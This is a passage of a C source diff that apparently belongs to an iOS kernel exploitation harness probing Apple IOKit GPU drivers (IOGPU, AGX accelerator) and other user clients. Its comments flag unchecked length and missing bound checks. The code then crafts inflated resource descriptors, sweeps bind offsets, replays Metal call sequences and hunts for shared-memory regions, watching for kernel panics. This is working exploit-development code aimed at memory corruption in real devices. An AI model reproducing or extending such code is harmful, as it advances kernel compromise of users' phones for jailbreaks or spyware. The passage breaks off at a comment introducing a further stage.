+        kern_return_t krs = IOConnectCallScalarMethod(c, sel, NULL, 0, sv, &sc);
+        // struct probe: insz 0, outsz 0
+        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+        size_t osz = 0;
+        kern_return_t kr0 = IOConnectCallMethod(c, sel, NULL, 0, NULL, 0, osc, &nosc, NULL, &osz);
+        // struct with data
+        osz = 0x1000;
+        memset(out, 0xAA, 0x2000);
+        nosc = 0;
+        kern_return_t kr1 = IOConnectCallMethod(c, sel, NULL, 0, in, 0x1000, osc, &nosc, out, &osz);
+        if (krs != 0xe00002c7 || kr0 != 0xe00002c7 || kr1 != 0xe00002c7) {
+            LOG("[mp] %s/%u sel %2u: scalar 0x%08x (cnt %u) | s00 0x%08x | s1000 0x%08x osz 0x%zx",
+                svc_name, type, sel, krs, sc, kr0, kr1, osz);
+            live++;
+        }
+        usleep(500);
+    }
+    LOG("[mp] %s/%u: %d live selectors", svc_name, type, live);
+    IOServiceClose(c);
+    vm_deallocate(mach_task_self(), (vm_address_t)in, 0x2000);
+    vm_deallocate(mach_task_self(), (vm_address_t)out, 0x2000);
+}
+static void p_method_probe(void) {
+    LOG("[v38] method-table probes");
+    probe_client("AppleJPEGDriver", 0);
+    probe_client("AppleJPEGDriver", 1);
+    probe_client("IOMobileFramebufferAP", 0);
+    probe_client("IOGPU", 1);
+    probe_client("AppleKeyStore", 0);
+    LOG("[v38] done");
+}
+
+
+// V39: IOGPU resource games (type-1 userclient).
+// sel8 s_new_resource: type 0x80 client buffer. in+0x38 = va1 (drives
+// res->len = va1 - base, UNCHECKED), in+0x48 = wired size. Inflate len.
+// sel38/39 replace backing (single atomic copy per statics — verify gates).
+static void p_iogpu(void) {
+    LOG("[v39] IOGPU resource games");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) { LOG("[gpu] open failed"); return; }
+    LOG("[gpu] conn 0x%x", c);
+    uint8_t *in = must_map(0x1000);
+    uint8_t *out = must_map(0x1000);
+    uint8_t *buf1 = must_map(0x4000);
+    uint8_t *buf2 = must_map(0x4000);
+    memset(buf1, 0x11, 0x4000);
+    memset(buf2, 0x22, 0x4000);
+
+    // 1) size discovery for sel 8
+    static const size_t inszs[] = { 0x58, 0x60, 0x68, 0x70, 0x80, 0x100, 0x200 };
+    static const size_t outszs[] = { 0x58, 0x80, 0x100, 0x220, 0x400, 0x1000 };
+    uint32_t rid = 0;
+    kern_return_t kr = KERN_FAILURE;
+    size_t osz = 0;
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    for (unsigned ii = 0; ii < sizeof(inszs)/sizeof(size_t) && !rid; ii++) {
+        for (unsigned oi = 0; oi < sizeof(outszs)/sizeof(size_t) && !rid; oi++) {
+            memset(in, 0, 0x1000); memset(out, 0, 0x1000);
+            *(uint32_t *)(in + 0x00) = 0x80;
+            *(uint32_t *)(in + 0x30) = 1;
+            *(uint64_t *)(in + 0x38) = (uint64_t)(uintptr_t)buf1 + 0x4000;
+            *(uint64_t *)(in + 0x40) = (uint64_t)(uintptr_t)buf1;
+            *(uint64_t *)(in + 0x48) = 0x4000;
+            osz = outszs[oi]; nosc = 0;
+            kr = IOConnectCallMethod(c, 8, NULL, 0, in, inszs[ii], osc, &nosc, out, &osz);
+            LOG("[gpu] sel8 insz 0x%zx outsz 0x%zx -> kr 0x%08x", inszs[ii], outszs[oi], kr);
+            if (kr == 0) rid = *(uint32_t *)(out + 0x24);
+            usleep(10000);
+        }
+    }
+    LOG("[gpu] sel8 normal -> kr 0x%08x rid %u", kr, rid);
+    if (!rid) { LOG("[gpu] no resource, abort"); return; }
+
+    // 2) inflated resource: va1 far beyond wired size
+    memset(in, 0, 0x1000); memset(out, 0, 0x1000);
+    *(uint32_t *)(in + 0x00) = 0x80;
+    *(uint32_t *)(in + 0x30) = 1;
+    *(uint64_t *)(in + 0x38) = (uint64_t)(uintptr_t)buf1 + 0x100000; // len ~1MB
+    *(uint64_t *)(in + 0x40) = (uint64_t)(uintptr_t)buf1;
+    *(uint64_t *)(in + 0x48) = 0x4000;                               // wired 16KB
+    osz = 0x58; nosc = 0;
+    kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x68, osc, &nosc, out, &osz);
+    uint32_t rid2 = *(uint32_t *)(out + 0x24);
+    LOG("[gpu] sel8 inflated -> kr 0x%08x rid %u (out+28 %llx)", kr, rid2,
+        *(uint64_t *)(out + 0x28));
+    // variant: out+0x28 reports rootLen — compare normal vs inflated
+    LOG("[gpu] inflated out: %016llx %016llx %016llx",
+        *(uint64_t *)(out + 0x00), *(uint64_t *)(out + 0x28), *(uint64_t *)(out + 0x30));
+
+    // 3) replaceable-flag hunt: create with various +0x15/+0x16 bits, then sel38
+    static const uint8_t f15[] = { 0, 8, 0 };   // +0x15
+    static const uint8_t f16[] = { 1, 0, 6 };   // +0x16
+    for (int v = 0; v < 3; v++) {
+        memset(in, 0, 0x1000); memset(out, 0, 0x1000);
+        *(uint32_t *)(in + 0x00) = 0x80;
+        *(uint32_t *)(in + 0x30) = 1;
+        in[0x15] = f15[v]; in[0x16] = f16[v];
+        *(uint64_t *)(in + 0x38) = (uint64_t)(uintptr_t)buf1 + 0x4000;
+        *(uint64_t *)(in + 0x40) = (uint64_t)(uintptr_t)buf1;
+        *(uint64_t *)(in + 0x48) = 0x4000;
+        osz = 0x58; nosc = 0;
+        kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x68, osc, &nosc, out, &osz);
+        uint32_t r3 = *(uint32_t *)(out + 0x24);
+        LOG("[gpu] sel8 f15 %02x f16 %02x -> kr 0x%08x rid %u", f15[v], f16[v], kr, r3);
+        if (kr || !r3) continue;
+        memset(in, 0, 0x1000);
+        *(uint32_t *)(in + 0x00) = r3;
+        *(uint64_t *)(in + 0x08) = (uint64_t)(uintptr_t)buf2;
+        *(uint64_t *)(in + 0x10) = 0x4000;
+        nosc = 0;
+        kern_return_t k38 = IOConnectCallMethod(c, 38, NULL, 0, in, 0x18, osc, &nosc, NULL, NULL);
+        LOG("[gpu]   sel38 on rid %u -> kr 0x%08x", r3, k38);
+    }
+
+    // 4) replace_backing_ranges: one record {buf2, 0x4000}
+    uint64_t *ranges = (uint64_t *)must_map(0x1000);
+    ranges[0] = (uint64_t)(uintptr_t)buf2;
+    ranges[1] = 0x4000;
+    memset(in, 0, 0x1000);
+    *(uint32_t *)(in + 0x00) = rid;
+    *(uint64_t *)(in + 0x08) = (uint64_t)(uintptr_t)ranges;
+    *(uint64_t *)(in + 0x10) = 1;
+    nosc = 0;
+    kr = IOConnectCallMethod(c, 39, NULL, 0, in, 0x18, osc, &nosc, NULL, NULL);
+    LOG("[gpu] sel39 replace_ranges -> kr 0x%08x", kr);
+
+    // 5) consumers of inflated resource: ops by id (46..53), mapping ops 45
+    for (uint32_t op = 46; op <= 53; op++) {
+        uint64_t sc_in[2] = { rid2, 0 };
+        nosc = 0;
+        kr = IOConnectCallMethod(c, op, sc_in, 1, NULL, 0, osc, &nosc, NULL, NULL);
+        if (kr != 0xe00002c7 && kr != 0xe00002c2)
+            LOG("[gpu] op %u on inflated -> kr 0x%08x", op, kr);
+    }
+    // 6) command queue (sel 42 scIn=2 scOut=2) for later submit games
+    uint64_t qin[2] = { 0, 0 };
+    uint64_t qout[2] = { 0, 0 };
+    uint32_t qoutc = 2;
+    kr = IOConnectCallScalarMethod(c, 42, qin, 2, qout, &qoutc);
+    LOG("[gpu] sel42 new_queue -> kr 0x%08x out %llx %llx", kr, qout[0], qout[1]);
+    LOG("[v39] done (alive)");
+}
+
+
+// V40: IOGPU VM map path. sel42 (VM obj) -> sel44 (attach memory) -> sel45
+// (bind resource at GPU-VA offset, NO bound check in IOGPUFamily; final
+// check is AGX-side). Sweep offsets; watch kr / panics.
+static void p_iogpu_vm(void) {
+    LOG("[v40] IOGPU VM map probes");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) { LOG("[vm] open failed"); return; }
+    uint8_t *in = must_map(0x1000);
+    uint8_t *out = must_map(0x1000);
+    uint8_t *buf1 = must_map(0x4000);
+    memset(buf1, 0x11, 0x4000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+
+    // resource
+    memset(in, 0, 0x1000); memset(out, 0, 0x1000);
+    *(uint32_t *)(in + 0x00) = 0x80;
+    *(uint32_t *)(in + 0x30) = 1;
+    *(uint64_t *)(in + 0x38) = (uint64_t)(uintptr_t)buf1 + 0x4000;
+    *(uint64_t *)(in + 0x40) = (uint64_t)(uintptr_t)buf1;
+    *(uint64_t *)(in + 0x48) = 0x4000;
+    size_t osz = 0x58;
+    kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x68, osc, &nosc, out, &osz);
+    uint32_t rid = *(uint32_t *)(out + 0x24);
+    LOG("[vm] sel8 -> kr 0x%08x rid %u", kr, rid);
+
+    // VM object
+    uint64_t qin[2] = {0, 0}, qout[2] = {0, 0};
+    uint32_t qc = 2;
+    kr = IOConnectCallScalarMethod(c, 42, qin, 2, qout, &qc);
+    LOG("[vm] sel42 -> kr 0x%08x out {%llx, %llx}", kr, qout[0], qout[1]);
+    uint64_t vmid = qout[0], vmtok = qout[1];
+
+    // attach memory: try candidate second args
+    static const char *cand_names[] = { "vmtok", "rid", "qid" };
+    uint64_t cands[3] = { vmtok, rid, 0 };
+    // also try queue id from sel6 (real command queue)
+    memset(in, 0, 0x1000); memset(out, 0, 0x1000);
+    osz = 0x10; nosc = 0;
+    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x408, osc, &nosc, out, &osz);
+    LOG("[vm] sel6 new_cmd_queue -> kr 0x%08x out {%llx, %llx}", kr,
+        *(uint64_t *)out, *(uint64_t *)(out + 8));
+    cands[2] = *(uint64_t *)out;
+
+    int attached = 0;
+    for (int i = 0; i < 3 && !attached; i++) {
+        uint64_t a2[2] = { vmid, cands[i] };
+        kr = IOConnectCallScalarMethod(c, 44, a2, 2, NULL, NULL);
+        LOG("[vm] sel44 attach %s (%llx) -> kr 0x%08x", cand_names[i], cands[i], kr);
+        if (kr == 0) attached = 1;
+    }
+    if (!attached) { LOG("[vm] no attach, abort"); return; }
+
+    // sel45 bind at sweeping offsets
+    static const uint64_t offs[] = { 0, 0x4000, 0x100000, 0x10000000, 0x100000000, 0x10000000000ULL };
+    for (unsigned i = 0; i < sizeof(offs)/8; i++) {
+        memset(in, 0, 0x1000);
+        *(uint32_t *)(in + 0x00) = 1;                    // count
+        *(uint32_t *)(in + 0x08) = rid;                  // resourceId
+        *(uint32_t *)(in + 0x0c) = 0;                    // index
+        *(uint64_t *)(in + 0x10) = offs[i];              // offset
+        *(uint8_t  *)(in + 0x18) = 0;                    // flag
+        nosc = 0;
+        kr = IOConnectCallMethod(c, 45, NULL, 0, in, 0x20, osc, &nosc, NULL, NULL);
+        LOG("[vm] sel45 bind off 0x%llx -> kr 0x%08x", offs[i], kr);
+        usleep(50000);
+    }
+    LOG("[v40] done (alive)");
+}
+
+
+// V41: full VM path: sel14 (notification queue -> ns 0x90) -> sel44 attach ->
+// sel45 bind at sweeping offsets. Plus IOConnectMapMemory64 type sweep.
+static void p_iogpu_vm2(void) {
+    LOG("[v41] IOGPU VM full path");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) { LOG("[vm2] open failed"); return; }
+    uint8_t *in = must_map(0x1000);
+    uint8_t *out = must_map(0x1000);
+    uint8_t *buf1 = must_map(0x4000);
+    memset(buf1, 0x11, 0x4000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+
+    // resource
+    memset(in, 0, 0x1000); memset(out, 0, 0x1000);
+    *(uint32_t *)(in + 0x00) = 0x80;
+    *(uint32_t *)(in + 0x30) = 1;
+    *(uint64_t *)(in + 0x38) = (uint64_t)(uintptr_t)buf1 + 0x4000;
+    *(uint64_t *)(in + 0x40) = (uint64_t)(uintptr_t)buf1;
+    *(uint64_t *)(in + 0x48) = 0x4000;
+    size_t osz = 0x58;
+    kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x68, osc, &nosc, out, &osz);
+    uint32_t rid = *(uint32_t *)(out + 0x24);
+    LOG("[vm2] sel8 -> kr 0x%08x rid %u", kr, rid);
+
+    // map memory type sweep
+    for (uint32_t mt = 0; mt < 12; mt++) {
+        mach_vm_address_t ma = 0; mach_vm_size_t msz = 0;
+        kern_return_t km = IOConnectMapMemory64(c, mt, mach_task_self(), &ma, &msz, 0);
+        if (!km) LOG("[vm2] MapMemory type %u -> addr %llx size %llx", mt, ma, msz);
+    }
+
+    // sel14: scIn=2 (type, index), stOut=0x10 (struct!) — id in out+8
+    uint64_t nqid = 0;
+    int nonzero = 0;
+    for (uint64_t t = 1; t <= 0x2000 && !nqid; t++) {
+        uint64_t a[2] = { t, 0 };
+        memset(out, 0, 0x1000);
+        size_t o16 = 0x10; nosc = 0;
+        kr = IOConnectCallMethod(c, 14, a, 2, NULL, 0, osc, &nosc, out, &o16);
+        if (kr == 0) { nqid = *(uint64_t *)(out + 8);
+            LOG("[vm2] sel14 type %llu -> nq id %llu (out0 %llx)", t, nqid, *(uint64_t *)out); }
+        else if (kr != 0xe00002c2 && kr != 0xe00002bd) {
+            if (nonzero < 10) LOG("[vm2] sel14 type %llu -> kr 0x%08x", t, kr);
+            nonzero++;
+        }
+    }
+    LOG("[vm2] sel14 sweep done, unusual krs %d", nonzero);
+    // VM
+    uint64_t qin[2] = {0, 0}, qout[2] = {0, 0};
+    uint32_t qc = 2;
+    kr = IOConnectCallScalarMethod(c, 42, qin, 2, qout, &qc);
+    uint64_t vmid = qout[0];
+    LOG("[vm2] sel42 -> kr 0x%08x vmid %llu tok %llx", kr, vmid, qout[1]);
+    if (!nqid || !vmid || !rid) { LOG("[vm2] missing pieces, abort"); return; }
+
+    // attach
+    uint64_t a44[2] = { vmid, nqid };
+    kr = IOConnectCallScalarMethod(c, 44, a44, 2, NULL, NULL);
+    LOG("[vm2] sel44 attach -> kr 0x%08x", kr);
+    if (kr) { LOG("[vm2] attach failed, abort"); return; }
+
+    // sel45 bind offset sweep
+    static const uint64_t offs[] = { 0, 0x4000, 0x100000, 0x40000000, 0x100000000, 0x8000000000ULL };
+    for (unsigned i = 0; i < sizeof(offs)/8; i++) {
+        memset(in, 0, 0x1000);
+        *(uint32_t *)(in + 0x00) = 1;
+        *(uint32_t *)(in + 0x08) = rid;
+        *(uint32_t *)(in + 0x0c) = 0;
+        *(uint64_t *)(in + 0x10) = offs[i];
+        *(uint8_t  *)(in + 0x18) = 0;
+        nosc = 0;
+        kr = IOConnectCallMethod(c, 45, NULL, 0, in, 0x20, osc, &nosc, NULL, NULL);
+        LOG("[vm2] sel45 bind off 0x%llx -> kr 0x%08x", offs[i], kr);
+        usleep(50000);
+    }
+    LOG("[v41] done (alive)");
+}
+
+
+// V42: find the AGX accelerator service on iOS + replicate Metal open
+static void p_agx_scan(void) {
+    LOG("[v42] AGX service scan");
+    static const char *names[] = {
+        "AGXAcceleratorG16P", "AGXAcceleratorG16", "AGXAccelerator",
+        "AGXAcceleratorG15P", "AGXAcceleratorG16G", "AGXG16P",
+        "AGXControl", "AGXDevice", "AGXService", "AppleAGXControl",
+        NULL
+    };
+    for (int i = 0; names[i]; i++) {
+        CFMutableDictionaryRef m = IOServiceMatching(names[i]);
+        if (!m) continue;
+        io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, m);
+        if (!svc) { LOG("[agx] %-24s NOT FOUND", names[i]); continue; }
+        static const uint32_t types[] = { 0, 1, 0x100005, 5, 0x100001 };
+        for (unsigned t = 0; t < sizeof(types)/4; t++) {
+            io_connect_t c = 0;
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), types[t], &c);
+            if (!kr && c) {
+                LOG("[agx] %-24s OPEN OK type 0x%x conn 0x%x", names[i], types[t], c);
+                IOServiceClose(c);
+            } else {
+                LOG("[agx] %-24s type 0x%x -> 0x%08x", names[i], types[t], kr);
+            }
+        }
+        IOObjectRelease(svc);
+    }
+    LOG("[v42] done");
+}
+
+
+// V43: replay Metal call sequence on AGXAcceleratorG16P (type 0x100001)
+static void p_agx_replay(void) {
+    LOG("[v43] AGX Metal-sequence replay");
+    io_connect_t c = open_service("AGXAcceleratorG16P", 0x100001);
+    if (!c) { LOG("[agx] open type 0x100001 failed"); return; }
+    LOG("[agx] conn 0x%x", c);
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+
+    // sel 9: resource creation (from trace: plain alloc variant)
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    *(uint64_t *)(in + 0x00) = 0;
+    *(uint64_t *)(in + 0x08) = 0x0000000100010001ULL;
+    *(uint64_t *)(in + 0x10) = 0x0000047001000101ULL;
+    *(uint64_t *)(in + 0x38) = 1;
+    *(uint64_t *)(in + 0x40) = 0x10000;
+    size_t osz = 0x100;
+    kern_return_t kr = IOConnectCallMethod(c, 9, NULL, 0, in, 104, osc, &nosc, out, &osz);
+    LOG("[agx] sel9 alloc -> kr 0x%08x osz 0x%zx out {%016llx %016llx %016llx}",
+        kr, osz, *(uint64_t *)out, *(uint64_t *)(out+8), *(uint64_t *)(out+16));
+
+    // sel 14: shmem {0x4000, 0}
+    for (uint64_t idx = 0; idx < 2; idx++) {
+        uint64_t a[2] = { 0x4000, idx };
+        memset(out, 0, 0x1000);
+        osz = 0x100; nosc = 0;
+        kr = IOConnectCallMethod(c, 14, a, 2, NULL, 0, osc, &nosc, out, &osz);
+        LOG("[agx] sel14 {0x4000,%llu} -> kr 0x%08x out {%016llx %016llx %016llx %016llx}",
+            idx, kr, *(uint64_t *)out, *(uint64_t *)(out+8), *(uint64_t *)(out+16), *(uint64_t *)(out+24));
+    }
+
+    // sel 16: {0x100, 0x28}
+    {
+        uint64_t a[2] = { 0x100, 0x28 };
+        memset(out, 0, 0x1000);
+        osz = 0x100; nosc = 0;
+        kr = IOConnectCallMethod(c, 16, a, 2, NULL, 0, osc, &nosc, out, &osz);
+        LOG("[agx] sel16 -> kr 0x%08x out {%016llx %016llx %016llx %016llx}",
+            kr, *(uint64_t *)out, *(uint64_t *)(out+8), *(uint64_t *)(out+16), *(uint64_t *)(out+24));
+    }
+
+    // sel 28 {1,1}, sel 17 {1}, sel 8 {1}, sel 15 {2}/{1}
+    uint64_t a28[2] = {1,1};
+    nosc = 0;
+    kr = IOConnectCallMethod(c, 28, a28, 2, NULL, 0, osc, &nosc, NULL, NULL);
+    LOG("[agx] sel28 {1,1} -> kr 0x%08x", kr);
+    uint64_t a17[1] = {1};
+    nosc = 0;
+    kr = IOConnectCallMethod(c, 17, a17, 1, NULL, 0, osc, &nosc, NULL, NULL);
+    LOG("[agx] sel17 {1} -> kr 0x%08x", kr);
+    uint64_t a8[1] = {1};
+    nosc = 0;
+    kr = IOConnectCallMethod(c, 8, a8, 1, NULL, 0, osc, &nosc, NULL, NULL);
+    LOG("[agx] sel8 {1} -> kr 0x%08x", kr);
+    uint64_t a15[1] = {2};
+    uint64_t o15[2] = {0,0}; uint32_t c15 = 2;
+    kr = IOConnectCallScalarMethod(c, 15, a15, 1, o15, &c15);
+    LOG("[agx] sel15 {2} -> kr 0x%08x out {%llx %llx}", kr, o15[0], o15[1]);
+
+    // map shmem types
+    for (uint32_t mt = 0; mt < 12; mt++) {
+        mach_vm_address_t ma = 0; mach_vm_size_t msz = 0;
+        kern_return_t km = IOConnectMapMemory64(c, mt, mach_task_self(), &ma, &msz, 0);
+        if (!km) LOG("[agx] MapMemory type %u -> %llx size %llx", mt, ma, msz);
+    }
+    LOG("[v43] done (alive)");
+}
+
+
+// V44: IOGPU submit path — sel6 size discovery, then sel25 submit probes.
+static void p_iogpu_submit(void) {
+    LOG("[v44] IOGPU submit path");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) { LOG("[sub] open failed"); return; }
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+
+    // sel6 new_command_queue: stIn size sweep
+    uint64_t qid = 0, qtok = 0;
+    for (size_t sz = 0x408; sz <= 0x600 && !qid; sz += 8) {
+        memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+        size_t osz = 0x10; nosc = 0;
+        kern_return_t kr = IOConnectCallMethod(c, 6, NULL, 0, in, sz, osc, &nosc, out, &osz);
+        if (kr != 0xe00002c2) {
+            LOG("[sub] sel6 stIn 0x%zx -> kr 0x%08x out {%llx %llx}", sz, kr,
+                *(uint64_t *)out, *(uint64_t *)(out + 8));
+            if (kr == 0) { qid = *(uint64_t *)out; qtok = *(uint64_t *)(out + 8); }
+        }
+    }
+    LOG("[sub] queue: qid %llu tok %llx", qid, qtok);
+    if (!qid) { LOG("[sub] no queue, abort"); return; }
+
+    // sel25 submit: count=0 first (no-op?)
+    {
+        uint64_t sc[4] = { qid, 0, 0, 0 };
+        uint64_t sout[2] = {0,0}; uint32_t scnt = 2;
+        kern_return_t kr = IOConnectCallScalarMethod(c, 25, sc, 4, sout, &scnt);
+        LOG("[sub] sel25 count=0 -> kr 0x%08x out %llx", kr, sout[0]);
+    }
+    // entrySize discovery: count=1, len sweep (wide)
+    for (size_t es = 0x208; es <= 0x4000; es += 8) {
+        uint64_t sc[4] = { qid, 0, 1, es };
+        memset(in, 0, 0x2000);
+        uint64_t sout[2] = {0,0}; uint32_t scnt = 2;
+        nosc = 0;
+        kern_return_t kr = IOConnectCallMethod(c, 25, sc, 4, in, es, sout, &scnt, NULL, NULL);
+        if (kr != 0xe00002c2)
+            LOG("[sub] sel25 entrySize 0x%zx -> kr 0x%08x out %llx", es, kr, sout[0]);
+        usleep(1000);
+    }
+    LOG("[v44] done (alive)");
+}
+
+
+// V45: IOGPU.framework end-to-end — device+queue via private C API, then
+// dump object internals to locate the queue shmem pointer.
+static void p_iogpu_fw(void) {
+    LOG("[v45] IOGPU.framework drive");
+    void *h = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_NOW);
+    if (!h) { LOG("[fw] dlopen failed: %s", dlerror()); return; }
+    typedef void *(*CreateDevFn)(void *, uint64_t);
+    typedef void *(*CreateQFn)(void *, void *, void *);
+    typedef uint32_t (*GetConnFn)(void *);
+    CreateDevFn DeviceCreate = (CreateDevFn)dlsym(h, "IOGPUDeviceCreate");
+    CreateQFn QueueCreate = (CreateQFn)dlsym(h, "IOGPUCommandQueueCreate");
+    GetConnFn GetConnect = (GetConnFn)dlsym(h, "IOGPUDeviceGetConnect");
+    LOG("[fw] DeviceCreate %p QueueCreate %p GetConnect %p", DeviceCreate, QueueCreate, GetConnect);
+    if (!DeviceCreate || !QueueCreate || !GetConnect) return;
+
+    void *dev = DeviceCreate(NULL, 0);
+    LOG("[fw] device %p", dev);
+    if (!dev) return;
+    LOG("[fw] device connect 0x%x", GetConnect(dev));
+    void *q = QueueCreate(dev, NULL, NULL);
+    LOG("[fw] queue %p", q);
+    if (!q) return;
+    // dump queue object — look for shmem pointers
+    uint64_t *qo = (uint64_t *)q;
+    for (int i = 0; i < 0x40; i += 4)
+        LOG("[fw] q+%03x: %016llx %016llx %016llx %016llx", i*8,
+            qo[i], qo[i+1], qo[i+2], qo[i+3]);
+    // probe each pointer-looking field: readable? dump first bytes
+    for (int i = 0; i < 0x40; i++) {
+        uint64_t v = qo[i];
+        if (v < 0x100000000 || v > 0x300000000ULL) continue;
+        vm_region_basic_info_data_64_t info;
+        mach_vm_size_t sz; mach_port_t obj; mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+        mach_vm_address_t addr = v;
+        kern_return_t kr = mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
+                                          (vm_region_info_t)&info, &cnt, &obj);
+        if (kr) continue;
+        uint8_t *b = (uint8_t *)(uintptr_t)v;
+        LOG("[fw] q+%02x ptr %llx -> region %llx+%llx: %02x %02x %02x %02x %02x %02x %02x %02x",
+            i*8, v, addr, (uint64_t)sz, b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
+    }
+    LOG("[v45] done (alive)");
+}
+
+
+// V46: iOS shmem selectors with Metal-traced values (0x4000/0x100 types)
+static void p_shmem_probe(void) {
+    LOG("[v46] shmem selector probes");
+    static const struct { const char *svc; uint32_t type; } conns[] = {
+        { "IOGPU", 1 }, { "AGXAcceleratorG16P", 1 }, { "AGXAcceleratorG16P", 0x100001 },
+    };
+    for (unsigned ci = 0; ci < 3; ci++) {
+        io_connect_t c = open_service(conns[ci].svc, conns[ci].type);
+        if (!c) { LOG("[sh] %s/%x open failed", conns[ci].svc, conns[ci].type); continue; }
+        LOG("[sh] --- %s/%x conn 0x%x", conns[ci].svc, conns[ci].type, c);
+        uint8_t *out = must_map(0x1000);
+        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+        static const uint64_t calls[][2] = {
+            { 0x4000, 0 }, { 0x4000, 1 }, { 0x100, 0x28 }, { 0x100, 0 },
+            { 0x2000, 0 }, { 0x8000, 0 },
+        };
+        for (unsigned i = 0; i < sizeof(calls)/16; i++) {
+            for (uint32_t sel = 14; sel <= 16; sel++) {
+                memset(out, 0, 0x1000);
+                size_t osz = 0x100; nosc = 0;
+                kern_return_t kr = IOConnectCallMethod(c, sel, (uint64_t *)calls[i], 2,
+                                                       NULL, 0, osc, &nosc, out, &osz);
+                if (kr != 0xe00002c2 && kr != 0xe00002c7)
+                    LOG("[sh] sel %u {%llx,%llx} -> kr 0x%08x out {%016llx %016llx %016llx}",
+                        sel, calls[i][0], calls[i][1], kr,
+                        *(uint64_t *)out, *(uint64_t *)(out+8), *(uint64_t *)(out+16));
+            }
+        }
+        IOServiceClose(c);
+    }
+    LOG("[v46] done");
+}
+
+
+// V47: dump getter outputs on IOGPU conn (looking for shmem ids/addrs)
+static void p_getters(void) {
+    LOG("[v47] getter dump");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    uint8_t *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    static const struct { uint32_t sel; size_t osz; } gs[] = {
+        { 0, 0x40 }, { 1, 0x40 }, { 2, 0x218 }, { 3, 8 }, { 4, 0x20 },
+        { 5, 0x10 }, { 16, 8 }, { 21, 0x30 }, { 22, 0x400 }, { 28, 0 },
+    };
+    for (unsigned i = 0; i < sizeof(gs)/sizeof(gs[0]); i++) {
+        memset(out, 0xAA, 0x1000);
+        size_t osz = gs[i].osz; nosc = 0;
+        uint64_t so[4] = {0,0,0,0}; uint32_t soc = 0;
+        kern_return_t kr = IOConnectCallMethod(c, gs[i].sel, NULL, 0, NULL, 0,
+                                               so, &soc, gs[i].osz ? out : NULL, &osz);
+        LOG("[gt] sel %2u -> kr 0x%08x osz 0x%zx soc %u", gs[i].sel, kr, osz, soc);
+        if (kr == 0) {
+            uint64_t *q = (uint64_t *)out;
+            for (int j = 0; j < 12; j += 4)
+                LOG("[gt]   +%02x: %016llx %016llx %016llx %016llx", j*8,
+                    q[j], q[j+1], q[j+2], q[j+3]);
+            if (soc) LOG("[gt]   scalars: %016llx %016llx", so[0], so[1]);
+        }
+    }
+    LOG("[v47] done");
+}
+
+
+// V48: diff VM regions before/after sel6 queue creation -> find queue shmem
+#define MAXREG 4096
+static uint64_t g_regions[MAXREG];
+static int collect_regions(void) {
+    int n = 0;
+    mach_vm_address_t addr = 0;
+    while (n < MAXREG) {
+        mach_vm_size_t sz = 0;
+        vm_region_basic_info_data_64_t info;
+        mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+        mach_port_t obj;
+        kern_return_t kr = mach_vm_region(mach_task_self(), &addr, &sz,
+            VM_REGION_BASIC_INFO_64, (vm_region_info_t)&info, &cnt, &obj);
+        if (kr) break;
+        g_regions[n++] = addr;
+        addr += sz;
+        if (!sz) break;
+    }
+    return n;
+}
+static int region_seen(uint64_t a, int n) {
+    for (int i = 0; i < n; i++) if (g_regions[i] == a) return 1;
+    return 0;
+}
+static void p_qshmem(void) {
+    LOG("[v48] queue shmem via region diff");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    int n0 = collect_regions();
+    LOG("[qs] regions before: %d", n0);
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    size_t osz = 0x10;
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    kern_return_t kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+    LOG("[qs] sel6 -> kr 0x%08x qid %llu tok %llx", kr,
+        *(uint64_t *)out, *(uint64_t *)(out + 8));
+    // walk again, find new
+    mach_vm_address_t addr = 0;
+    int found = 0;
+    for (;;) {
+        mach_vm_size_t sz = 0;
+        vm_region_basic_info_data_64_t info;
+        mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+        mach_port_t obj;
+        kern_return_t k2 = mach_vm_region(mach_task_self(), &addr, &sz,
+            VM_REGION_BASIC_INFO_64, (vm_region_info_t)&info, &cnt, &obj);
+        if (k2) break;
+        if (!region_seen(addr, n0)) {
+            uint8_t *b = (uint8_t *)(uintptr_t)addr;
+            LOG("[qs] NEW region %llx size %llx: %02x %02x %02x %02x %02x %02x %02x %02x",
+                addr, (uint64_t)sz, b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
+            found++;
+        }
+        addr += sz;
+        if (!sz) break;
+    }
+    LOG("[qs] new regions: %d", found);
+    LOG("[v48] done");
+}
+
+
+// V49: queue shmem structure + doorbell behavior
